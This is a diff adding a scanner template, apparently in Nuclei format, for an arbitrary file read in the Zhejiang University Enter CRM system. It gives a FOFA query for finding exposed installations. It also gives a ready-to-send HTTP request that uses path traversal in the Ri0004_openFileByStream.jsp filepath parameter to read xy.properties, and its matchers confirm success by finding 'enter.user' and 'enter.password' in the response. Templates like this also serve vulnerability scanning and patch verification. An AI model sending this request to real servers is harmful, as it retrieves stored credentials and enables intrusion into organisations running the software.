@@ -1,0 +1,30 @@
+id: zjuent-file-read
+
+info:
+  name: "浙大恩特客户资源管理系统Ri0004_openFileByStream.jsp接口任意文件读取"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: app="浙大恩特客户资源管理系统"
+      浙大恩特客户资源管理系统为客户提供客户资源管理功能，支持销售与市场活动的数字化流程。该系统Ri0004_openFileByStream.jsp接口存在文件读取权限控制缺陷，攻击者可通过构造特定路径参数读取任意文件内容，可能暴露敏感数据或导致系统被入侵。
+  tags: 浙大恩特客户资源管理系统
+
+http:
+- raw:
+  - |
+    GET /entsoft/module/i0004_openFileByStream.jsp?filepath=/../EnterCRM/bin/xy.properties&filename=conan HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Connection: Keep-Alive
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'enter.user'
+  - type: word
+    part: body
+    words:
+    - 'enter.password'
